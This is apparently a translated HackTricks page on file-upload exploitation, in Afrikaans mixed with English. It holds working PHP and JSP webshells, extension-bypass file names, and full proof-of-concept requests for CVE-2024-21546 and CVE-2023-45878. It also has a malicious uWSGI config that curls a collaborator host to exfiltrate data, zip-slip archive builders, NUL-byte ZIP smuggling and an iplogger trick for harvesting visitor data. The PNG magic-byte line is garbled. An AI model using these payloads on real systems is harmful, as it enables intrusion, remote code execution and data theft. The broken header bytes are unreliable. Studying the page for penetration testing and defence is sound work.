# Lêeroplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Ander nuttige extensies:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil kontroles van lêeruitbreidings

1. As dit van toepassing is, **kontroleer** die **voorgaande uitbreidings.** Toets dit ook met sommige **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kontroleer **om 'n geldige uitbreiding voor** die uitvoeringsuitbreiding by te voeg (gebruik ook voorgaande uitbreidings):_
- _file.png.php_
- _file.png.Php5_
3. Probeer om **spesiale karakters aan die einde by te voeg.** Jy kan Burp gebruik om alle **ascii** en **Unicode** karakters te **bruteforce**. (_Let daarop dat jy ook kan probeer om die **voorheen** genoemde **uitbreidings** te gebruik_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskermings te omseil deur die ekstensie-parser aan die bedienerkant te mislei met tegnieke soos **dubbeling** van die **uitbreiding** of **byvoeging van rommel** data (**null** bytes) tussen uitbreidings. _Jy kan ook die **voorgaande uitbreidings** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg **nog 'n laag uitbreidings** by die vorige kontrole:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **uitvoeringsuitbreiding voor die geldige uitbreiding** te plaas en hoop die bediener is verkeerd gekonfigureer. (nuttig om Apache-misconfigurasies uit te buit waar iets met die uitbreiding .php, maar nie noodwendig eindigend in .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval sal 'n kolon-teken ":" ingesit word na 'n verbode uitbreiding en voor 'n toegelate een. As gevolg daarvan sal 'n **leë lêer met die verbode uitbreiding** op die bediener geskep word (e.g. "file.asax:.jpg”). Hierdie lêer kan later met ander tegnieke gewysig word, soos deur sy kortlêernaam te gebruik. Die "**::$data**” patroon kan ook gebruik word om nie-lege lêers te skep. Daarom kan dit nuttig wees om 'n puntkarakter na hierdie patroon by te voeg om verdere beperkings te omseil (e.g. "file.asp::$data.”)
8. Probeer om die lêernaamgrense te breek. Die geldige uitbreiding word afgesny. En die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Sommige upload handlers sny of normaliseer afloopende puntkarakters uit die gestoor lêernaam. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) weergawes voor 2.9.1, kan jy die validasie van uitbreidings omseil deur:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoor pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Omseil Content-Type, Magic Number, Compression & Resizing

- Omseil die **Content-Type** kontroles deur die **waarde** van die **Content-Type** **header** te stel op: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Omseil die **magic number** kontrole deur aan die begin van die lêer die **bytes of a real image** by te voeg (om die _file_ command te mislei). Of plaas die shell binne die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan ook die **payload direk in 'n image inbring**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- As **compressie** by jou image gevoeg word, byvoorbeeld deur standaard PHP-biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie nuttig wees nie. Jy kan egter die **PLTE chunk** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan ook die **image verklein**, byvoorbeeld met die PHP-GD funksies `imagecopyresized` of `imagecopyresampled`. Jy kan egter die **IDAT chunk** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog ’n tegniek om ’n payload te maak wat ’n image-verkleining **oorleef**, gebruik die PHP-GD funksie `thumbnailImage`. Jy kan egter die **tEXt chunk** [**tegniek hier gedefinieer**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **kompressie oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ander truuks om te kontroleer

- Vind ’n kwesbaarheid om die lêer wat reeds opgelaai is te **hernoem** (om die extensie te verander).
- Vind ’n **Local File Inclusion** kwesbaarheid om die backdoor uit te voer.
- **Moontlike inligtingslek**:
1. Laai **veral** (en op dieselfde tyd) dieselfde lêer met dieselfde naam op
2. Laai ’n lêer op met die **naam** van ’n **lêer** of **map** wat reeds bestaan
3. Laai ’n lêer op met **"." , "..", of "…" as naam**. Byvoorbeeld, in Apache op **Windows**, as die aansoek die opgelaaide lêers in "/www/uploads/" stoor, sal die "." filename ’n lêer genaamd uploads” in die "/www/" directory skep.
4. Laai ’n lêer op wat nie maklik verwyder kan word nie, soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai ’n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai ’n lêer op in **Windows** met **gereserveerde** (**verbode**) **name** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9.
- Probeer ook om ’n **uitvoerbare lêer** (.exe) of ’n **.html** (minder verdag) op te laai wat **kode sal uitvoer** wanneer dit per ongeluk deur ’n slagoffer geopen word.

### Spesiale extensie-truuks

As jy probeer om lêers op ’n **PHP server** op te laai, [kyk na die **.htaccess** truc om kode uit te voer](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
As jy probeer om lêers op ’n **ASP server** op te laai, [kyk na die **.config** truc om kode uit te voer](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` lêers is soos die `.jar` vir java, maar vir php, en kan soos ’n **php file** gebruik word (dit met php uitvoer, of dit insluit binne ’n script...).

Die `.inc` extensie word soms gebruik vir php-lêers wat slegs gebruik word om **files te import**, so op ’n stadium kon iemand hierdie extensie toegelaat het om **uitgevoer te word**.

## **Jetty RCE**

As jy ’n XML-lêer in ’n Jetty server kan oplaaI, kan jy [RCE kry omdat **nuwe *.xml en *.war outomaties verwerk word**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Soos in die volgende beeld genoem, laai die XML-lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Vir ’n gedetailleerde verkenning van hierdie kwesbaarheid, sien die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwesbaarhede kan uitgebuit word in uWSGI servers as iemand die vermoë het om die `.ini` konfigurasielêer te wysig. uWSGI konfigurasielêers gebruik ’n spesifieke sintaksis om "magic" veranderlikes, plekhouers, en operatore in te sluit. Veral die '@' operator, benut as `@(filename)`, is ontwerp om die inhoud van ’n lêer in te sluit. Onder die verskeie ondersteunde schemes in uWSGI, is die "exec" scheme besonder kragtig, wat die lees van data vanaf ’n proses se standaarduitset moontlik maak. Hierdie funksie kan gemanipuleer word vir kwaadaardige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer ’n `.ini` konfigurasielêer verwerk word.

Kyk na die volgende voorbeeld van ’n kwaadwillige `uwsgi.ini` lêer wat verskeie schemes toon:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload vind plaas tydens die ontleding van die konfigurasielêer. Om die konfigurasie te aktiveer en te ontleed, moet die uWSGI-proses óf herbegin word (moontlik na 'n crash of as gevolg van 'n Denial of Service-aanval) óf die lêer moet op auto-reload gestel word. Die auto-reload-funksie, indien ingeskakel, herlaai die lêer op gespesifiseerde intervalle wanneer veranderinge gedetecteer word.

Dit is noodsaaklik om die slap aard van uWSGI se konfigurasielêer-ontleding te verstaan. Spesifiek kan die bespreekte payload in 'n binêre lêer ingesit word (soos 'n beeld of PDF), wat die omvang van moontlike eksploitasie verder uitbrei.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

'n Onautentiseerde endpoint in Gibbon LMS laat arbitrary file write binne die web root toe, wat lei tot pre-auth RCE deur 'n PHP-lêer neer te sit. Kwesbare weergawes: tot en met 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (die server ignoreer tipe/naam, base64-dekodeer die agterkant)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC om 'n lêer te skryf en terug te lees:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Plaas 'n minimale webshell en voer opdragte uit:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notas:
- Die handler voer `base64_decode($_POST["img"])` uit nadat dit by `;` en `,` gesplit is, en skryf dan bytes na `$absolutePath . '/' . $_POST['path']` sonder om die uitbreiding/tipe te valideer.
- Die resulterende kode loop as die webdiensgebruiker (bv., XAMPP Apache on Windows).

Verwysings vir hierdie fout sluit die usd HeroLab advisory en die NVD entry in. Sien die Verwysings-afdeling hieronder.

## **wget File Upload/SSRF Trick**

In sommige gevalle mag jy vind dat 'n bediener **`wget`** gebruik om **lêers af te laai** en jy kan die **URL** aandui. In sulke gevalle mag die kode nagaan dat die uitbreiding van die afgelaaide lêers binne 'n whitelist is om te verseker dat slegs toegelate lêers afgelaai gaan word. Egter, **hierdie check kan omseil word.**\
Die **maksimum** lengte van 'n **filename** in **linux** is **255**, maar **wget** kort die filenamers af tot **236** karakters. Jy kan **download a file called "A"*232+".php"+".gif"**, hierdie filenaam sal die **bypass** van die **check** moontlik maak (soos in hierdie voorbeeld is **".gif"** 'n **valid** uitbreiding) maar `wget` sal die lêer **rename** na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

### Escaping upload directory via NTFS junctions (Windows)

(Vir hierdie aanval sal jy plaaslike toegang tot die Windows-masjien nodig hê) Wanneer uploads gestoor word in per-gebruiker subgidse op Windows (bv., C:\Windows\Tasks\Uploads\<id>\) en jy beheer die skep/verwydering van daardie subgids, kan jy dit vervang met 'n directory junction wat na 'n sensitiewe ligging wys (bv., die webroot). Volgende uploads sal in die teikenpad geskryf word, wat code-uitvoering moontlik maak as die teiken server‑side code interpreteer.

Example flow to redirect uploads into XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Aantekeninge
- mklink /J creates an NTFS directory junction (reparse point). Die webbediener se rekening moet die junction volg en skryfregte in die bestemming hê.
- Dit herlei arbitrêre lêerskrywings; as die bestemming skripte uitvoer (PHP/ASP), word dit RCE.
- Verdedigingsmaatreëls: moenie skryfbare upload-roots onder C:\Windows\Tasks of soortgelyke plekke deur 'n aanvaller beheerbaar laat wees nie; blokkeer die skepping van junctions; valideer uitbreidings server-side; stoor uploads op 'n aparte volume of met deny-execute ACLs.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Sommige upload/ingest handlers skryf die rou request body na 'n filesystem-pad wat uit gebruikersbeheerde query-parameters saamgestel word. As die handler ook Content-Encoding: gzip ondersteun en versuim om die destination path te kanoniseer/valideer, kan jy directory traversal kombineer met 'n gzipped payload om arbitrêre bytes te skryf in 'n web-served directory en RCE te verkry (bv. drop 'n JSP onder Tomcat’s webapps).

Generiese uitbuitingsvloei:
- Bereid jou server-side payload voor (bv. minimal JSP webshell) en gzip-compress die bytes.
- Stuur 'n POST waar 'n path parameter (bv. token) traversering bevat wat die beoogde folder ontsnap, en file die filename aandui om te persist. Stel Content-Type: application/octet-stream en Content-Encoding: gzip; die body is die compressed payload.
- Blaai na die geskryfde lêer om uitvoering te triggeren.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Dan aktiveer:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notas
- Teikenpaaie wissel na gelang van installasie (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite se Hackvertor-uitbreiding kan 'n korrekte gzip body uit jou payload produseer.
- Dit is 'n suiwer pre-auth arbitrary file write → RCE patroon; dit maak nie staat op multipart parsing nie.

Mitigering
- Bepaal upload-bestemmings op die bedienerkant; vertrou nooit padfragmente van kliënte nie.
- Canonicaliseer en dwing af dat die opgeloste pad binne 'n toegelate basisgids bly.
- Bêre uploads op 'n nie-uitvoerbare volume en weier skripuitvoering vanaf skryfbare paaie.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel ontwerp om Pentesters and Bug Hunters te help om file upload-meganismes te toets. Dit gebruik verskeie bug bounty techniques om die proses van identifisering en uitbuiting van kwesbaarhede te vereenvoudig en sodoende deeglike assesserings van webapplicasies te verseker.

### Korrupte upload-indekse as gevolg van snprintf-eienaardighede (histories)

Sommige verouderde upload-handlers wat `snprintf()` of soortgelyke funksies gebruik om multi-file arrays uit 'n single-file upload te bou, kan mislei word om die `_FILES`-struktuur te vervals. As gevolg van inkonsekwenthede en afkapping in die gedrag van `snprintf()`, kan 'n sorgvuldig saamgestelde enkele upload op die bedienerkant as verskeie geïndekseerde lêers verskyn, wat logika wat 'n streng vorm aanvaar (bv. dit as 'n multi-file upload behandel en onveilige takke neem) in die war sal stuur. Alhoewel nisvandag, kom hierdie "index corruption"-patroon af en toe weer voor in CTFs en ouer codebasisse.

## Van File upload na ander kwesbaarhede

- Stel **filename** op `../../../tmp/lol.png` en probeer 'n **path traversal** bereik
- Stel **filename** op `sleep(10)-- -.jpg` en jy kan dalk 'n **SQL injection** bereik
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n XSS te bewerkstellig
- Stel **filename** op `; sleep 10;` om sekere command injection te toets (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/] and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content op om te kontroleer of die bediener enige **antivirus** het
- Kyk of daar enige **size limit** is wanneer jy lêers oplaai

Hier is 'n top 10 lys van dinge wat jy deur oplaai kan bereik (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp-uitbreiding


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiese Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Raadpleeg [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander filetypes.

## Zip/Tar-lêer wat outomaties gedekomprimeer word tydens upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Laai 'n archive wat symboliese skakels na ander lêers bevat; deur die gedecomprimeerde lêers te benader sal jy toegang tot die gelinkte lêers kry:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Ontpak in verskillende vouers

Die onverwagte skepping van lêers in gidse tydens ontpakking is 'n beduidende probleem. Alhoewel aanvanklike aannames was dat hierdie opstelling moontlik teen OS-level command execution deur malicious file uploads sou beskerm, kan die hiërargiese kompressie-ondersteuning en directory traversal capabilities van die ZIP archive format uitgebuit word. Dit stel attackers in staat om beperkings te omseil en uit secure upload directories te ontsnap deur die decompression functionality van die geteikende toepassing te manipuleer.

'n Geautomatiseerde exploit om sulke lêers te skep is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die hulpmiddel kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Verder is die **symlink trick with evilarc** 'n opsie. As die doel is om 'n lêer soos `/flag.txt` te teiken, moet 'n symlink na daardie lêer op jou stelsel geskep word. Dit verseker dat evilarc geen foute tydens sy werking ondervind nie.

Hieronder is 'n voorbeeld van Python-kode wat gebruik word om 'n kwaadaardige zip-lêer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Misbruik van kompressie vir file spraying**

Vir meer besonderhede **sien die oorspronklike pos op**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Skep 'n PHP Shell**: PHP-kode word geskryf om opdragte wat deur die `$_REQUEST`-veranderlike deurgegee word, uit te voer.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying en die skep van gekompresseerde lêers**: Meerdere lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Wysiging met 'n hex-editor of vi**: Die name van die lêers binne die zip word verander met vi of 'n hex-editor, deur "xxA" na "../" te verander om na bo in die gidsboom te gaan.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

Wanneer 'n backend ZIP-inskrywings valideer met behulp van PHP’s ZipArchive maar die ekstraksie na die lêerstelsel skryf met rou name, kan jy 'n nie-toegelate uitbreiding insmous deur 'n NUL (0x00) in die lêernaamvelde in te voeg. ZipArchive behandel die inskrywingnaam as 'n C‑string en kort dit by die eerste NUL af; die lêerstelsel skryf die volle naam, en verwerp alles na die NUL.

Hoëvlak vloei:
- Bereid 'n egte houer-lêer voor (bv. 'n geldige PDF) wat 'n klein PHP-stub in 'n stream inbed, sodat die magic/MIME steeds 'n PDF bly.
- Noem dit bv. `shell.php..pdf`, zip dit, en hex-bewerk dan die ZIP lokale header en sentrale gidslêernaam om die eerste `.` na `.php` met `0x00` te vervang, wat lei tot `shell.php\x00.pdf`.
- Valideerders wat op ZipArchive staatmaak sal `shell.php .pdf` "sien" en dit toelaat; die ekstrakteerder skryf `shell.php` na skyf, wat tot RCE kan lei as die upload-lêergids uitvoerbaar is.

Minimal PoC-stappe:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Aantekeninge
- Verander ALBEI die filename-voorkoms (local en central directory). Sommige gereedskap voeg ook 'n ekstra data descriptor-entry by – pas alle name-velde aan indien teenwoordig.
- Die payload-lêer moet steeds server‑side magic/MIME sniffing slaag. Die inkapseling van die PHP in 'n PDF-stream hou die header geldig.
- Werk waar die enum/validation-pad en die extraction/write-pad nie saamstem oor string-handtering nie.

### Gestapelde/gekoppelde ZIPs (parser-onenigheid)

